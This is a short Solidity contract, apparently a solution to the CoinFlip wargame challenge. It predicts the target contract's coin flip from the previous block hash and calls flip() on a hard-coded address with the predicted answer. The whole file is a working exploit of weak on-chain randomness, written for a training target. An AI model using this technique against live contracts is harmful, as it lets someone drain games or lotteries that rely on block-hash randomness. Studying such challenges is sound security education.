//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

// You know what functions you can call, so you define an interface to TestInterface.
interface CoinFlip {
     function flip(bool _guess) external returns (bool);
     function consecutiveWins() external view returns (uint);
}

contract Flipper {
  uint lastHash;
  uint FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
  address originalAddress = 0xfa9C82BBbC7ADF279232bcE9974e4da1DF2EE66e;
  CoinFlip public originalContract = CoinFlip(originalAddress);


  function Fliptify() public {   
    uint blockValue = uint256(blockhash(block.number - 1));
    uint coinFlip = blockValue/FACTOR;
    bool side = coinFlip == 1 ? true : false;    
    originalContract.flip(side);
  }

  function getWins() public view returns (uint) {
      return originalContract.consecutiveWins();
  }
}